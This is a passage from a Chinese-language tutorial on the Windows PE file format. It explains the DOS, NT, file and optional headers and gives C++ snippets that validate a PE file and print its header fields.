class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hModule = <span class="built_in">GetModuleHandle</span>(<span class="literal">NULL</span>);</span><br><span class="line">    std::cout &lt;&lt; hModule &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PE 文件加载的基地址 (ImageBase)：EXE 默认基地址为 0x00400000，DLL 默认基地址为 0x10000000，这个值可以在链接应用时使用链接程序的 /BASE 选项设定，或者通过 REBASE 应用程序进行设置。说完基地址，再来说下相对虚拟地址，由于 PE 文件中里的东西可以载入到空间的任何位置，所以不能依赖于 PE 的载入点，必须有一个方法来指定地址而不依赖于 PE 载入点的地址，所以出现相对虚拟地址 (RVA) 概念，RVA 只是内存中的一个简单的相对于 PE 文件装入地址的偏移位置，例如，假设一个 EXE 文件从地址 0x400000 处装入，并且它的代码区块开始于 0x401000，代码区块的 RVA 就是：0x401000 – 0x400000 = 0x1000，在这里，0x401000 是实际的内存地址，这个地址被称为虚拟内存地址 (VA)，另外也可以把虚拟地址想象为加上首选装入地址的 RVA。</p><h2 id="文件偏移地址"><a href="#文件偏移地址" class="headerlink" title="文件偏移地址"></a>文件偏移地址</h2><p>当 PE 文件储存在磁盘上，某个数据的位置相对于文件头的偏移量，称为文件偏移地址或物理地址。文件偏移地址从 PE 文件的第一个字节开始计数，起始值为 0，用十六进制文本编辑器打开文件，里头显示的就是文件偏移地址。</p><h2 id="IMAGE-DOS-HEADER-结构"><a href="#IMAGE-DOS-HEADER-结构" class="headerlink" title="IMAGE_DOS_HEADER 结构"></a>IMAGE_DOS_HEADER 结构</h2><p><img src="https://image.zeronohacker.com/article/2018/12/24/100902xhvfefb5jf5j45be.png" alt=""></p><p>在这个结构体中，有两个字段非常重要，分别是第一个和最后一个，其它的不重要，其中第一个 e_magic 字段需要被设置为 0x5A4D。它也被称为魔术数字。</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100926k80ot4fjfu0qm1ov.png" alt=""></p><p>这个值有个宏定义，名为 IMAGE_DOS_SIGNATURE，它的 ASCII 值为 MZ，是 MS-DOS 的最初创建者之一 Mark Zbikowski 字母的缩写。</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/100948ota0a21iteiztt0t.png" alt=""></p><p>e_lfanew 字段是真正 PE 文件头的相对偏移（RVA），那么，这个字段在哪呢？</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101013bp14g9p7cz7zvadv.png" alt=""></p><p>上图已经说明了，为了验证是否正确，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101034vtog24sxkxoo3k21.png" alt=""></p><p>在 3CH 偏移处，显示 0x00000110 (由于 Intel CPU 属于 Little-Endian 类，字符存储时低位在前，高位在后，反序排列，将顺序恢复后便是 0x00000110)，这个是 e_lfanew 字段所存储的值，它占 4 个字节。后面就是 PE 头了。</p><h2 id="IMAGE-NT-HEADER-结构"><a href="#IMAGE-NT-HEADER-结构" class="headerlink" title="IMAGE_NT_HEADER 结构"></a>IMAGE_NT_HEADER 结构</h2><p><img src="https://image.zeronohacker.com/article/2018/12/24/101103izx0tct3acnl3xft.png" alt=""></p><p>在一个有效的 PE 文件里，Signature 字段被设置为 0x00004550，ASCII 码字符是 PE00</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101127usuosiszoij7osug.png" alt=""></p><p>宏定义为 IMAGE_NT_SIGNATURE</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101153ky45o5pjkqnqteto.png" alt=""></p><p>那么这两个重要的字段 (e_lfanew 和 Signature) 有什么用呢？这个在以后解析 PE 文件，判断一个文件是否是一个 PE 文件时提供重要依据，即判断这两个字段的值是否为 0x5A4D 和 0x00004550，你也可以用它们的宏定义，分别为 IMAGE_DOS_SIGNATURE 和 IMAGE_NT_SIGNATURE，如果相等，则为一个 PE 文件，如果不相等，则不是一个 PE 文件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1.首先须打开一个文件</span></span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">        <span class="built_in">TEXT</span>(<span class="string">&quot;test.png&quot;</span>),</span><br><span class="line">        GENERIC_ALL,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 2.判断文件句柄是否有效，若无效则提示打开文件失败并退出</span></span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;打开文件失败！&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.若打开文件成功，则获取文件的大小</span></span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 4.申请内存空间，用于存放文件数据</span></span><br><span class="line">    BYTE * FileBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">    <span class="comment">// 5.读取文件内容</span></span><br><span class="line">    DWORD dwReadFile = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">ReadFile</span>(hFile, FileBuffer, dwFileSize, &amp;dwReadFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 6.判断这个文件是不是一个有效的PE文件</span></span><br><span class="line">    <span class="comment">//    6.1 先检查 DOS 头中的 MZ 标记，判断 e_magic 字段是否为 0x5A4D，或者是 IMAGE_DOS_SIGNATURE</span></span><br><span class="line">    DWORD dwFileAddr = (DWORD)FileBuffer;</span><br><span class="line">    <span class="keyword">auto</span> DosHeader = (PIMAGE_DOS_HEADER)dwFileAddr;</span><br><span class="line">    <span class="keyword">if</span> (DosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果不是则提示用户，并立即结束</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;这不是一个有效 PE 文件&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">        <span class="keyword">delete</span>[] FileBuffer;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//    6.2 若都通过的话再获取 NT 头所在的位置，并判断 e_lfanew 字段是否为 0x00004550，或者是 IMAGE_NT_SIGNATURE</span></span><br><span class="line">    <span class="keyword">auto</span> NtHeader = (PIMAGE_NT_HEADERS)(dwFileAddr + DosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="keyword">if</span> (NtHeader-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果不是则提示用户，并立即结束</span></span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;这不是一个有效 PE 文件&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">        <span class="keyword">delete</span>[] FileBuffer;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 7.若上述都通过，则为一个有效的 PE 文件</span></span><br><span class="line">    <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;这是一个有效 PE 文件&quot;</span>), <span class="built_in">TEXT</span>(<span class="string">&quot;提示&quot;</span>), MB_OK);</span><br><span class="line">    <span class="keyword">delete</span>[] FileBuffer;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="comment">// 8.结束程序</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码就是简单实现判断一个文件是不是有效的 PE 文件。在上述代码中，运用了 CreateFile()、GetFileSize()、ReadFile() 来获取文件内容，得到文件的基址 dwFileAddr，只需将该变量转换成 PIMAGE_DOS_HEADER 类型，那么就能获取到 NT 头的开始位置，NT 头的位置可通过 (PIMAGE_NT_HEADERS)((PIMAGE_DOS_HEADER)dwFileAddr-&gt;e_lfanew + dwFileAddr) 获取，有了这个，后面的工作就变得简单多了。</p><h2 id="IMAGE-FILE-HEADER-结构"><a href="#IMAGE-FILE-HEADER-结构" class="headerlink" title="IMAGE_FILE_HEADER 结构"></a>IMAGE_FILE_HEADER 结构</h2><p><img src="https://image.zeronohacker.com/article/2018/12/24/101254s5g40z4tzcw077yj.png" alt=""></p><p>该结构体描述的是文件的一般性质，有 7 个字段，共占 20 个字节，20 相当于十六进制的 14H，下图已标出实际位置，如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101317t3uougwpvga25x3w.png" alt=""></p><ul><li>第 1 处标记的是 Machine 字段，占两个字节，它的值为 0x014C，代表的是 Intel i386 平台。</li><li>第 2 处标记的是 NumberOfSections 字段，占两个字节，它的值为 0x0006，代表的是有 6 个区块，也可以说有 6 个节。</li><li>第 3 处标记的是 TimeDateStamp 字段，占四个字节，它的值为 0x5C0748D5，代表的是文件创建日期和时间。由以下图可以看出，该文件创建时间为 2018-12-05 / 11:41:09。<br><img src="https://image.zeronohacker.com/article/2018/12/24/101343te0hecseval0eel2.png" alt=""></li><li>第 4 处值以 0 填充，用不到。</li><li>第 5 处值以0填充，用不到。</li><li>第 6 处字段就比较重要，划重点，SizeOfOptionalHeader，占两个字节，它的值为 0x00E0，代表的是 IMAGE_OPTIONAL_HEADER32 结构的大小，在 32 位系统，它的值为 0x00E0，在 64 位系统，它的值为 0x00F0，</li><li>第 7 处最后一个字段 Characteristics，占两个字节，它的值为 0x0102，代表的是文件的属性。这个值是由 0x0100 和 0x0002 两者之和，0x0100 这个值代表的是目标平台为 32 位机器，0x0002 这个值代表文件可执行，如果为 0，一般是链接出现了问题。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取文件头</span></span><br><span class="line"><span class="keyword">auto</span> FileHeader = NtHeader-&gt;FileHeader;</span><br><span class="line"><span class="comment">// 接下来就是解析各字段</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;运行平台：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.Machine &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;区块数目：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.NumberOfSections &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;文件创建日期和时间：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.TimeDateStamp &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IMAGE_OPTIONAL_HEADER32结构大小：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.SizeOfOptionalHeader &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;文件属性：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.Characteristics &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>将上述代码插入到 return 0; 之前，运行如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101427zf1xwf4jzi5i5xgk.png" alt=""></p><p>再将上面文件创建日期和时间进行转换，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取文件头</span></span><br><span class="line"><span class="keyword">auto</span> FileHeader = NtHeader-&gt;FileHeader;</span><br><span class="line"><span class="comment">// 接下来就是解析各字段</span></span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;运行平台：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.Machine &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;区块数目：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.NumberOfSections &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">// 进行时间转换</span></span><br><span class="line">tm FileCreateTime = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> nError = <span class="built_in">gmtime_s</span>(&amp;FileCreateTime, (<span class="keyword">time_t</span>*)&amp;FileHeader.TimeDateStamp);</span><br><span class="line"><span class="keyword">if</span> (!nError)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;文件创建日期和时间：&quot;</span> &lt;&lt; std::dec &lt;&lt; FileCreateTime.tm_year + <span class="number">1900</span> &lt;&lt; <span class="string">&quot;-&quot;</span></span><br><span class="line">        &lt;&lt; FileCreateTime.tm_mon + <span class="number">1</span> &lt;&lt; <span class="string">&quot;-&quot;</span></span><br><span class="line">        &lt;&lt; FileCreateTime.tm_mday &lt;&lt; <span class="string">&quot; &quot;</span></span><br><span class="line">        &lt;&lt; FileCreateTime.tm_hour + <span class="number">8</span> &lt;&lt; <span class="string">&quot;:&quot;</span></span><br><span class="line">        &lt;&lt; FileCreateTime.tm_min &lt;&lt; <span class="string">&quot;:&quot;</span></span><br><span class="line">        &lt;&lt; FileCreateTime.tm_sec &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;IMAGE_OPTIONAL_HEADER32结构大小：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.SizeOfOptionalHeader &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;文件属性：0x&quot;</span> &lt;&lt; std::hex &lt;&lt; FileHeader.Characteristics &lt;&lt; std::endl;</span><br></pre></td></tr></table></figure><p>上面是用到了 tm 的结构，以及 gmtime_s 这个函数进行转换，在用之前需要包含头文件 time.h，运行如下：</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101511ks13t1en11s1efn1.png" alt=""></p><p>不过还是要注意下，首先 tm_year 这个值为十六进制，需转成十进制，而且要加上 1900，因为时间是从 1900 开始算，它的值为偏移，其次月是从 0 开始算的，所以要加 1，最后是时区问题，因为我这里位于东八区，所以小时需加上 8。另外关于调试的那两个字段，没有必要去对它深究，因为微软的VS已用了新的 Debug 格式，这个只是用来设置 COFF 符号，跟 COFF 符号有关，一般这个值都为 0，所以不探讨它。关于运行平台代码和文件属性代码可以去网上查表就行，这里就省略。</p><h2 id="IMAGE-OPTIONAL-HEADER-结构"><a href="#IMAGE-OPTIONAL-HEADER-结构" class="headerlink" title="IMAGE_OPTIONAL_HEADER 结构"></a>IMAGE_OPTIONAL_HEADER 结构</h2><p><img src="https://image.zeronohacker.com/article/2018/12/24/101529oflj8jv835dfzlli.png" alt=""></p><p>上图展示的是 IMAGE_OPTIONAL_HEADER32 结构体各字段，这个结构体相对来说就比较大，我已经分析好了，这个是 32 位的，64 位的大体结构没变，只是有几个字段改成的 ULONGLONG 类型，那么它在实际内部是怎么样的呢？下面这张图是验证上面图片所叙述的。</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101549rggwziijno4tzm01.png" alt=""></p><p>上图所标记的，为 IMAGE_OPTIONAL_HEADER32 结构所有成员，你也注意到了，在结尾处，有 .text，说明已经到了该结构体的末尾了，算了一下，恰好占了 224 个字节，这个值其实在 IMAGE_FILE_HEADER 中倒数第二个字段已经指出了，值为 0xE0，这个值相当于十进制中的 224。为了更好的说明，我用序号标记了各个字段，其中有一些为透明，一是没地方标，二是能看清实际数值大小，这样便于分析。</p><p><img src="https://image.zeronohacker.com/article/2018/12/24/101613zqrdmhla98udt5sr.png" alt=""></p><p>以下是各字段解析：</p><div class="table-container"><table><thead><tr><th>序号</th><th><strong>字段</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>0001</td><td>Magic</td><td>这个是一个标记，它的值为 0x010B，代表的是普通的可执行映象，一般是 0x010B，如果是 64 位，则为 0x020B，如果为 ROM 映象，该值为 0x0107</td></tr><tr><td>0002</td><td>MajorLinkerVersion</td><td>链接程序主版本号，值为 0x0E</td></tr><tr><td>0003</td><td>MinorLinkerVersion</td><td>链接程序次版本号，值为 0x00</td></tr><tr><td>0004</td><td><strong>SizeOfCode</strong></td><td>所有含有代码区块的总大小，该值为 0x0031D000，这个代码区块是带有 IMAGE_SCN_CNT_CODE 属性，这个值是向上对齐某一个值的整数倍。通常情况下，多数文件只有一个 Code 块，所以这个字段和 .text 块的大小匹配</td></tr><tr><td>0005</td><td>SizeOfInitializedData</td><td>所有初始化数据区块总大小，该值为 0x000B4000，这个是在编译时所构成的块的大小（不包括代码段），一般这个值是不准确的</td></tr><tr><td>0006</td><td>SizeOfUninitializedData</td><td>所有未初始化数据区块总大小，该值为 0，这些块在程序开始运行时没有指定值，未初始化的数据通常在 .bss 块中</td></tr><tr><td>0007</td><td><strong>AddressOfEntryPoint</strong></td><td>程序执行入口 RVA，该值为 0x002B56D0。在大多数可执行文件中，这个地址并不直接指向 Main、WinMain 或者是 DllMain，而是指向运行库代码并由它来调用上述函数。对于 DLL 来说，这个入口点是在程序初始化和关闭时以及线程创建和毁灭时被调用</td></tr><tr><td>0008</td><td><strong>BaseOfCode</strong></td><td>代码段的起始 RVA，该值为 0x00001000，如果是用微软的链接器生成的，则该值通常是 0x00001000</td></tr><tr><td>0009</td><td><strong>BaseOfData</strong></td><td>数据段的起始 RVA，该值为 0x0031E000，数据段通常在内存的末尾，对于不同版本的微软链接器，这个值是不一致的，在64位可执行文件中是不出现的</td></tr><tr><td>0010</td><td><strong>ImageBase</strong></td><td>程序默认装入地址，该值为 0x00400000，加载器试图在这个地址表装入 PE 文件，如果可执行文件是在这个地址装入的，那么加载器将跳过应用基址重定位的步骤</td></tr><tr><td>0011</td><td><strong>SectionAlignment</strong></td><td>内存中区块对齐大小，值为 0x00001000，默认对齐尺寸是目标 CPU 的页尺寸，最小的对齐尺寸是一页 1000H（4KB），在 IA-64 上，这个值是 8KB。每个区块装入地址必定是本字段指定数值的整数倍</td></tr><tr><td>0012</td><td><strong>FileAlignment</strong></td><td>磁盘上 PE 文件内的区块对齐大小，值为 0x00000200，对于 x86 的可执行文件，这个值通常是 200H 或 1000H，这是为了保证块总是从磁盘的扇区开始的，这个值必须是 2 的幂，最小为 200H</td></tr><tr><td>0013</td><td>MajorOperatingSystemVersion</td><td>要求操作系统的最低版本号的主版本号，该值为 0x0006，这个值似乎没什么用</td></tr><tr><td>0014</td><td>MinorOperatingSystemVersion</td><td>同上，没什么用</td></tr><tr><td>0015</td><td>MajorImageVersion</td><td>同上，没什么用</td></tr><tr><td>0016</td><td>MinorImageVersion</td><td>同上，没什么用</td></tr><tr><td>0017</td><td>MajorSubsystemVersion</td><td>同上，没什么用</td></tr><tr><td>0018</td><td>MinorSubsystemVersion</td><td>同上，没什么用</td></tr><tr><td>0019</td><td>Win32VersionValue</td><td>同上，没什么用</td></tr><tr><td>0020</td><td>SizeOfImage</td><td>映象装入内存后的总尺寸，该值为 0x003D5000，它指装入文件从 ImageBase 到最后一个块的大小，最后一个块根据其大小往上取整</td></tr><tr><td>0021</td><td>SizeOfHeaders</td><td>是 MS-DOS 头部、PE 头部、区块表的组合尺寸。该值为 0x00000400</td></tr><tr><td>0022</td><td>CheckSum</td><td>校验和，IMAGEHLP.DLL 中的 CheckSumMappedFile 函数可以计算这个值，一般的EXE文件可以是 0，但一些内核模式的驱动程序和系统 DLL 必须有一个校验和</td></tr><tr><td>0023</td><td>Subsystem</td><td>一个标明可执行文件所期望的子系统的枚举值，这个值只对 EXE 是重要的。该值为 0x0003</td></tr><tr><td>0024</td><td>DllCharacteristics</td><td>DllMain() 函数何时被调用，默认为 0</td></tr><tr><td>0025</td><td>SizeOfStackReserve</td><td>在 EXE 文件里，为线程保留的堆栈大小，它一开始只提交其中一部分，只有在必要时，才提交剩下的部分</td></tr><tr><td>0026</td><td>SizeOfStackCommit</td><td>在 EXE 文件里，一开始即被委派堆栈的内存数量，默认值为 4KB</td></tr><tr><td>0027</td><td>SizeHeapReserve</td><td>在 EXE 文件里，为进程的默认堆保留的内存，默认值为 1MB，但是在当前 Windows 里，堆值在用户不干涉的情况下就能增长超过这个值</td></tr><tr><td>0028</td><td>SizeOfHeapCommit</td><td>在 EXE 文件里，委派给堆的内存大小，默认值是 4KB</td></tr><tr><td>0029</td><td>LoaderFlag</td><td>与调试有关，默认为 0</td></tr><tr><td>0030</td><td>NumberOfRvaAndSizes</td><td>数据目录表的项数，这个字段一直以来都为 16</td></tr><tr><td>0031</td><td><strong>DataDirectory[16]</strong></td><td>数据目录表，由数个 IMAGE_DATA_DIRECTORY 结构组成，指向输入表、输出表、资源等数据</td></tr></tbody></table></div><div class="tip "><p>提示：以上表格中有颜色标记的为比较重要的字段 </p></div><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取扩展头各个字段</span></span><br><span class="line"><span class="keyword">auto</span> OptionalHeader = NtHeader-&gt;OptionalHeader;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;扩展头解析&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">if</span> (OptionalHeader.Magic == <span class="number">0x10b</span>)</span><br><span class="line">&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;文件类型：32位&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;链接器的主版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; (<span class="keyword">int</span>)OptionalHeader.MajorLinkerVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;链接器的次版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; (<span class="keyword">int</span>)OptionalHeader.MinorLinkerVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;所有含有代码区块的总大小:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.SizeOfCode &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;所有初始化数据区块的总大小:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.SizeOfInitializedData &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;所有未初始化数据区块的总大小:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.SizeOfUninitializedData &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;程序执行入口:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.AddressOfEntryPoint &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;程序默认装入基地址:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.ImageBase &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;内存中区块对齐值:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.SectionAlignment &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;文件中区块对齐值:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.FileAlignment &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;操作系统主版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span class="built_in">setfill</span>(<span class="string">&#x27;0&#x27;</span>) </span><br><span class="line">    &lt;&lt; std::<span class="built_in">setw</span>(<span class="number">8</span>) &lt;&lt; OptionalHeader.MajorOperatingSystemVersion &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;操作系统次版本号:0x&quot;</span> &lt;&lt; std::hex &lt;&lt; std::<span 